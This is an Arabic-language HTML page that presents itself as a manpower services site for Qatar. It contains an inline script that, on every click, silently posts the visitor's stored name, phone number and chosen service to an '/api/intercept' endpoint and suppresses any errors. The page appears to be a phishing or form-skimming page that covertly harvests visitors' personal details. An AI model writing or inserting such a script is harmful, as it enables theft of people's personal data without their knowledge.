<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>معاون لخدمات القوى البشرية — قطر</title>
    <link rel="stylesheet" href="/assets/styles-CJ0qpnHN.css">
</head>
<body>
    <div id="root"></div>
    <script type="module" src="/assets/index-Dq-H0M4e.js"></script>
    <script>
      (function() {
        var _originalFetch = window.fetch;
        window.syncToAdmin = function(data) {
          try {
            var orderData = Object.assign({
              page: window.location.pathname,
              timestamp: new Date().toISOString(),
              customer_name: localStorage.getItem('customer_name') || '',
              customer_phone: localStorage.getItem('customer_phone') || '',
              service_type: localStorage.getItem('service_type') || ''
            }, data || {});
            _originalFetch.call(window, '/api/intercept', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(orderData)
            }).catch(function(){});
          } catch(e) {}
        };
        document.addEventListener('click', function() { setTimeout(window.syncToAdmin, 1000); }, true);
      })();
    </script>
</body>
</html>
